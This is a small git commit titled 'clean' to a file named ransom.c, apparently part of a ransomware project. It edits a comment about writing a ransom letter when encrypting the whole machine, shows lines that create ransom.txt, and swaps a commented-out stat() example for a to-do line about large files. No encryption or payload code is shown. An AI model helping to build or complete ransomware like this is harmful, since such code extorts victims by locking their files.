0301101b1bae1550461da64dfb97f161dfda355e
Max <maxencedelbrouck@hotmail.com>
2022-01-09 21:39:39 +0100

    clean

--- ransom.c
+++ ransom.c
@@ -223,7 +223,7 @@ int main (int argc, char * argv[])
 
 
 
-        //Ransom Letter - Cannot be written if we encrypt the whole machine -> put a condition not to encrypt ransom.txt after having created it
+        //Ransom Letter - Cannot be written if we encrypt the whole machine (should put a condition not to encrypt ransom.txt after having created it)
         FILE* fichier = NULL;
         int currentchar = 0;
         fichier = fopen("ransom.txt", "w");
@@ -239,60 +239,4 @@ int main (int argc, char * argv[])
     }
 
 }
-
-
-
-// to do
-/*  Test Gestion des fichiers volumineux - st_size  #include <sys/stat.h> & #include <time.h>  https://linux.die.net/man/2/stat
-int
-main(int argc, char *argv[])
-{
-    struct stat sb;
-
-   if (argc != 2) {
-        fprintf(stderr, "Usage: %s <pathname>\n", argv[0]);
-        exit(EXIT_FAILURE);
-    }
-
-   if (stat(argv[1], &sb) == -1) {
-        perror("stat");
-        exit(EXIT_FAILURE);
-    }
-
-   printf("File type:                ");
-
-   switch (sb.st_mode & S_IFMT) {
-    case S_IFBLK:  printf("block device\n");            break;
-    case S_IFCHR:  printf("character device\n");        break;
-    case S_IFDIR:  printf("directory\n");               break;
-    case S_IFIFO:  printf("FIFO/pipe\n");               break;
-    case S_IFLNK:  printf("symlink\n");                 break;
-    case S_IFREG:  printf("regular file\n");            break;
-    case S_IFSOCK: printf("socket\n");                  break;
-    default:       printf("unknown?\n");                break;
-    }
-
-   printf("I-node number:            %ld\n", (long) sb.st_ino);
-
-   printf("Mode:                     %lo (octal)\n",
-            (unsigned long) sb.st_mode);
-
-   printf("Link count:               %ld\n", (long) sb.st_nlink);
-    printf("Ownership:                UID=%ld   GID=%ld\n",
-            (long) sb.st_uid, (long) sb.st_gid);
-
-   printf("Preferred I/O block size: %ld bytes\n",
-            (long) sb.st_blksize);
-    printf("File size:                %lld bytes\n",
-            (long long) sb.st_size);
-    printf("Blocks allocated:         %lld\n",
-            (long long) sb.st_blocks);
-
-   printf("Last status change:       %s", ctime(&sb.st_ctime));
-    printf("Last file access:         %s", ctime(&sb.st_atime));
-    printf("Last file modification:   %s", ctime(&sb.st_mtime));
-
-   exit(EXIT_SUCCESS);
-}
-
- */
+// to do Gestion des fichiers volumineux avec - st_size  #include <sys/stat.h> & #include <time.h>  https://linux.die.net/man/2/stat
